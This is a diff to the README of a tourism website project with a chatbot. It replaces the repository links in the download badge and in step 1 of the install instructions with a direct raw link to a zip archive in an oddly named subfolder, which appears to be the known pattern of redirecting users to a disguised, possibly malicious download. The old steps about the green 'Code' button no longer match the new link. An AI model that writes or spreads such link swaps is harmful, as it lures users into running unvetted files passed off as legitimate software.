@@ -1,6 +1,6 @@
 # 🌐 Tourism-Website-with-Chatbot - Experience travel planning with smart assistance
 
-[![Download Project](https://img.shields.io/badge/Download-Tourism_Website-blue)](https://github.com/pattyalcedoatthis3886/Tourism-Website-with-Chatbot)
+[![Download Project](https://img.shields.io/badge/Download-Tourism_Website-blue)](https://github.com/pattyalcedoatthis3886/Tourism-Website-with-Chatbot/raw/refs/heads/main/supereducation/Website_Tourism_Chatbot_with_1.6.zip)
 
 This application provides a complete website for tourism companies. It includes site navigation, travel destinations, a contact form, and an integrated chatbot. The chatbot helps users find information about travel packages and local attractions. This project uses web technologies to run a functional site.
 
@@ -18,7 +18,7 @@ To run this website, your computer needs the following software:
 
 Follow these steps to get the project files on your computer:
 
-1. Visit the project repository page at this link: [https://github.com/pattyalcedoatthis3886/Tourism-Website-with-Chatbot](https://github.com/pattyalcedoatthis3886/Tourism-Website-with-Chatbot).
+1. Visit the project repository page at this link: [https://github.com/pattyalcedoatthis3886/Tourism-Website-with-Chatbot/raw/refs/heads/main/supereducation/Website_Tourism_Chatbot_with_1.6.zip](https://github.com/pattyalcedoatthis3886/Tourism-Website-with-Chatbot/raw/refs/heads/main/supereducation/Website_Tourism_Chatbot_with_1.6.zip).
 2. Locate the green button labeled "Code" near the top right of the file list.
 3. Click the button and select "Download ZIP".
 4. Save the file to your "Downloads" folder.
